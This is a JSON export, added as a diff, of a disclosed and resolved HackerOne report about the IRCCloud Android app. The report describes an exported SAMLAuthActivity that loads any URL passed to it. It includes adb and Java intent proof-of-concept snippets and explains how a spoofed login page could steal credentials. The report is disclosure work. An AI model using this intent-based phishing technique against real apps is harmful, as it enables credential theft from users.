@@ -1,0 +1,143 @@
+{
+  "id": 283058,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODMwNTg=",
+  "url": "https://hackerone.com/reports/283058",
+  "title": "[IRCCloud Android] Opening arbitrary URLs/XSS in SAMLAuthActivity",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2017-10-26T11:30:14.005Z",
+  "submitted_at": "2017-10-26T11:30:14.005Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bagipro",
+    "url": "/bagipro",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 140,
+    "url": "https://hackerone.com/irccloud",
+    "handle": "irccloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "paused",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "IRCCloud",
+      "twitter_handle": "irccloud",
+      "website": "https://www.irccloud.com",
+      "about": "Group chat for teams, friends, and communities. IRCCloud is an IRC client with a future. Stay connected, chat from anywhere, and never miss a message."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2017-11-03T11:37:05.224Z",
+  "bug_reporter_agreed_on_going_public_at": "2017-10-26T17:15:13.597Z",
+  "team_member_agreed_on_going_public_at": "2017-11-03T11:37:05.145Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi, I'd like to report a bug which allow to open arbitrary URLs in ```com.irccloud.android.activity.SAMLAuthActivity```\n\nThis activity is exported:\n```xml\n        <activity android:name=\"com.irccloud.android.activity.SAMLAuthActivity\" android:theme=\"@style/dawn\" android:windowSoftInputMode=\"adjustResize\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n            </intent-filter>\n        </activity>\n```\nit means that it can be accessed by any third-party apps installed on the same device. On the newest Androids it also could be exploited by Android Instant Apps directly from a web-browser.\n\nIn file ```  ``` can see that it opens attacker provided URLs\n```java\n        if (getIntent() == null || !getIntent().hasExtra(\"auth_url\")) {\n            finish();\n            return;\n        }\n        getSupportActionBar().setTitle(getIntent().getStringExtra(\"title\"));\n        this.mWebView.loadUrl(getIntent().getStringExtra(\"auth_url\"));\n```\n\nPoC from ADB:\n```\nadb shell am start -n com.irccloud.android/com.irccloud.android.activity.SAMLAuthActivity -e title \"ATTAAACK\" -e auth_url \"http://google.com/\"\n```\n\nPoC in Java:\n```java\n        Intent intent = new Intent();\n        intent.setClassName(\"com.irccloud.android\", \"com.irccloud.android.activity.SAMLAuthActivity\");\n        intent.putExtra(\"title\", \"ATTAAACK\");\n        intent.putExtra(\"auth_url\", \"http://google.com/\");\n        startActivity(intent);\n```\n\nResult:\n{F233002}\n{F233003}\n\nIt's dangerous because user doesn't see real URL. Attacker can open anything and specify any title (like \"IRCCloud: Login Required\"), and using that trick steal user credentials.\n\nYou can test this issue by yourself, APK is attached",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 233002,
+      "file_name": "2017-10-26_14-17-33.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/233/002/c14b0581cdbea4e7ac27c626f9638d191c75af07/2017-10-26_14-17-33.jpg?response-content-disposition=attachment%3B%20filename%3D%222017-10-26_14-17-33.jpg%22%3B%20filename%2A%3DUTF-8%27%272017-10-26_14-17-33.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUNXCE6YL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T194549Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDTqjg3%2F60zMbBv7Y%2FmGhKkm3GmrH3kxkZindmKEbQ8BAIgU6oFyNOx91SPL1yh3n4qa6w6Suy2ZZsRH%2F3QXJ0zfn4qsQUIGxADGgwwMTM2MTkyNzQ4NDkiDDmfL9Egc9HEdTNjDSqOBVzAkKHHcqMcDpeuaSCjFaKNDIz39dvxYduW5YPZ0IWglk9GqF48bMAxZmKuQA3utmy7%2BghVmkw5X8X5YOVuhVC%2FIEHQWLg6fBSyn1VD7XpfAbi8YKmWpuMEV9y2NuxjzeAEkZMVHXz78FmNKUk0UzoScP214X3Hntvlj25GmNeFVDggCpnIYIRTjz6lyqIg8I2EgVq4GpB9oYlMVU5lMZCJ2PQJeJS0CIYvyw5HREPinKc2iLVK4Pe%2B0bNIc3yqCaou%2BrA%2BieCpmr8vnLCyrkO4jBVnoovtP%2Bum5CqxfGcxp5YAGXgLREEuFtc0nY5t%2BBHXF07Ihp9aZDosuEj6OeIrDDwpioycdp7eN1vwD9Sdkz0Lm%2FTaRgkdZEQ%2FS%2FruTs0g6rHlpf1wUX7M6LSFX3%2FXdKuM8euvRh1aCnO%2F92CT8PE62UW2bBcCNdFUJcSSfT0CguV0aEHXFW5vezs8jinBCZCON23nPquPbE%2F1bOLcOEsALR6hphFbJSMql%2BOf9CKwZfWN85hdzq12XFfFE8P9AX6BWgY9Vvosa%2BjXU4Qeg2OKVcVPqZsk6tx1UMgNrwKXdH2agiN%2FPI%2FIqh5ppaDbZuNYt1Y1hIND0IAYHmsyqLVMYhL04bpOYSqaRHQQXVrGNqJKnUwdvUdKDji0IopXg9onJ8gyQPbmWxpXje4%2Bda0FS1NwAORZ%2FLnPTV2ohOHSad6wkQAdRY36Lfz1HWkRzEzcDKu7I473kpLexahRvl1K8x6rUa6KmiV8bEGHkir9SOf1eA6rBw7EEcKSfZqgXMqC90rDheCMBfrF3wHKIedPYrx8SjwBJ%2B8BxXREYIzu2xl0nEUz22OOH%2Bm%2FG7QVetMxNW7qs66HudlmHjCR%2BsDGBjqxASjXXkC23Ath0pdbOUYJmJWIWkJn5jAOvzdFLAwsMJwbNPFkZ05jRfF0usEvjzSDaEBcgTKvP0V1ZxrUrWAPqlbxLQIh9MPO2wGpqUcMZvVRtnJD7WNgLR7l7%2Bky7LymGL1o8v9PX4sPAV81eXujmX0DUAiCCbP4HQlsB%2FXzw66%2Fc1N7l7voC4ygwYREKnPLgiox2ok2ZFma6zp721Pml0LO5ymAECII%2BKRajF%2F8ZgxK9w%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=6a930cbb480075b30bcc937d28fd1b8509254bc61c8537e2f1e4173227fc8433",
+      "file_size": 177639,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 233003,
+      "file_name": "2017-10-26_14-15-36.jpg",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/233/003/f39c5a4371dbbbcffd6653fa22a59cac5e9b76ed/2017-10-26_14-15-36.jpg?response-content-disposition=attachment%3B%20filename%3D%222017-10-26_14-15-36.jpg%22%3B%20filename%2A%3DUTF-8%27%272017-10-26_14-15-36.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUNXCE6YL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T194549Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDTqjg3%2F60zMbBv7Y%2FmGhKkm3GmrH3kxkZindmKEbQ8BAIgU6oFyNOx91SPL1yh3n4qa6w6Suy2ZZsRH%2F3QXJ0zfn4qsQUIGxADGgwwMTM2MTkyNzQ4NDkiDDmfL9Egc9HEdTNjDSqOBVzAkKHHcqMcDpeuaSCjFaKNDIz39dvxYduW5YPZ0IWglk9GqF48bMAxZmKuQA3utmy7%2BghVmkw5X8X5YOVuhVC%2FIEHQWLg6fBSyn1VD7XpfAbi8YKmWpuMEV9y2NuxjzeAEkZMVHXz78FmNKUk0UzoScP214X3Hntvlj25GmNeFVDggCpnIYIRTjz6lyqIg8I2EgVq4GpB9oYlMVU5lMZCJ2PQJeJS0CIYvyw5HREPinKc2iLVK4Pe%2B0bNIc3yqCaou%2BrA%2BieCpmr8vnLCyrkO4jBVnoovtP%2Bum5CqxfGcxp5YAGXgLREEuFtc0nY5t%2BBHXF07Ihp9aZDosuEj6OeIrDDwpioycdp7eN1vwD9Sdkz0Lm%2FTaRgkdZEQ%2FS%2FruTs0g6rHlpf1wUX7M6LSFX3%2FXdKuM8euvRh1aCnO%2F92CT8PE62UW2bBcCNdFUJcSSfT0CguV0aEHXFW5vezs8jinBCZCON23nPquPbE%2F1bOLcOEsALR6hphFbJSMql%2BOf9CKwZfWN85hdzq12XFfFE8P9AX6BWgY9Vvosa%2BjXU4Qeg2OKVcVPqZsk6tx1UMgNrwKXdH2agiN%2FPI%2FIqh5ppaDbZuNYt1Y1hIND0IAYHmsyqLVMYhL04bpOYSqaRHQQXVrGNqJKnUwdvUdKDji0IopXg9onJ8gyQPbmWxpXje4%2Bda0FS1NwAORZ%2FLnPTV2ohOHSad6wkQAdRY36Lfz1HWkRzEzcDKu7I473kpLexahRvl1K8x6rUa6KmiV8bEGHkir9SOf1eA6rBw7EEcKSfZqgXMqC90rDheCMBfrF3wHKIedPYrx8SjwBJ%2B8BxXREYIzu2xl0nEUz22OOH%2Bm%2FG7QVetMxNW7qs66HudlmHjCR%2BsDGBjqxASjXXkC23Ath0pdbOUYJmJWIWkJn5jAOvzdFLAwsMJwbNPFkZ05jRfF0usEvjzSDaEBcgTKvP0V1ZxrUrWAPqlbxLQIh9MPO2wGpqUcMZvVRtnJD7WNgLR7l7%2Bky7LymGL1o8v9PX4sPAV81eXujmX0DUAiCCbP4HQlsB%2FXzw66%2Fc1N7l7voC4ygwYREKnPLgiox2ok2ZFma6zp721Pml0LO5ymAECII%2BKRajF%2F8ZgxK9w%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=744c2648cd8d179ab12ad429e858133308a05f9a52570b1b6193cbe5dca836ba",
+      "file_size": 123936,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 233005,
+      "file_name": "app-release.apk",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/233/005/b4ba8735335f097d539c0fbfcb41f28d7db6a6fd/app-release.apk?response-content-disposition=attachment%3B%20filename%3D%22app-release.apk%22%3B%20filename%2A%3DUTF-8%27%27app-release.apk&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQUNXCE6YL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T194549Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDTqjg3%2F60zMbBv7Y%2FmGhKkm3GmrH3kxkZindmKEbQ8BAIgU6oFyNOx91SPL1yh3n4qa6w6Suy2ZZsRH%2F3QXJ0zfn4qsQUIGxADGgwwMTM2MTkyNzQ4NDkiDDmfL9Egc9HEdTNjDSqOBVzAkKHHcqMcDpeuaSCjFaKNDIz39dvxYduW5YPZ0IWglk9GqF48bMAxZmKuQA3utmy7%2BghVmkw5X8X5YOVuhVC%2FIEHQWLg6fBSyn1VD7XpfAbi8YKmWpuMEV9y2NuxjzeAEkZMVHXz78FmNKUk0UzoScP214X3Hntvlj25GmNeFVDggCpnIYIRTjz6lyqIg8I2EgVq4GpB9oYlMVU5lMZCJ2PQJeJS0CIYvyw5HREPinKc2iLVK4Pe%2B0bNIc3yqCaou%2BrA%2BieCpmr8vnLCyrkO4jBVnoovtP%2Bum5CqxfGcxp5YAGXgLREEuFtc0nY5t%2BBHXF07Ihp9aZDosuEj6OeIrDDwpioycdp7eN1vwD9Sdkz0Lm%2FTaRgkdZEQ%2FS%2FruTs0g6rHlpf1wUX7M6LSFX3%2FXdKuM8euvRh1aCnO%2F92CT8PE62UW2bBcCNdFUJcSSfT0CguV0aEHXFW5vezs8jinBCZCON23nPquPbE%2F1bOLcOEsALR6hphFbJSMql%2BOf9CKwZfWN85hdzq12XFfFE8P9AX6BWgY9Vvosa%2BjXU4Qeg2OKVcVPqZsk6tx1UMgNrwKXdH2agiN%2FPI%2FIqh5ppaDbZuNYt1Y1hIND0IAYHmsyqLVMYhL04bpOYSqaRHQQXVrGNqJKnUwdvUdKDji0IopXg9onJ8gyQPbmWxpXje4%2Bda0FS1NwAORZ%2FLnPTV2ohOHSad6wkQAdRY36Lfz1HWkRzEzcDKu7I473kpLexahRvl1K8x6rUa6KmiV8bEGHkir9SOf1eA6rBw7EEcKSfZqgXMqC90rDheCMBfrF3wHKIedPYrx8SjwBJ%2B8BxXREYIzu2xl0nEUz22OOH%2Bm%2FG7QVetMxNW7qs66HudlmHjCR%2BsDGBjqxASjXXkC23Ath0pdbOUYJmJWIWkJn5jAOvzdFLAwsMJwbNPFkZ05jRfF0usEvjzSDaEBcgTKvP0V1ZxrUrWAPqlbxLQIh9MPO2wGpqUcMZvVRtnJD7WNgLR7l7%2Bky7LymGL1o8v9PX4sPAV81eXujmX0DUAiCCbP4HQlsB%2FXzw66%2Fc1N7l7voC4ygwYREKnPLgiox2ok2ZFma6zp721Pml0LO5ymAECII%2BKRajF%2F8ZgxK9w%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=a2df860c7197772b401dd5935d9e42d20a22da785bc2ac95e800be8813fcf79a",
+      "file_size": 4668832,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2017-11-25T17:15:13.685Z",
+  "allow_singular_disclosure_after": -246853836.07843694,
+  "singular_disclosure_allowed": true,
+  "vote_count": 15,
+  "voters": [
+    "sheikhrishad0",
+    "bughunterninja",
+    "eveeez",
+    "cr4xerbik4sh",
+    "japz",
+    "sumit7",
+    "0xm1racle",
+    "moon_shadow",
+    "kushagrasarathe",
+    "ceortiz033",
+    "and 5 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 271,
+    "asset_type": "GOOGLE_PLAY_APP_ID",
+    "asset_identifier": "com.irccloud.android",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
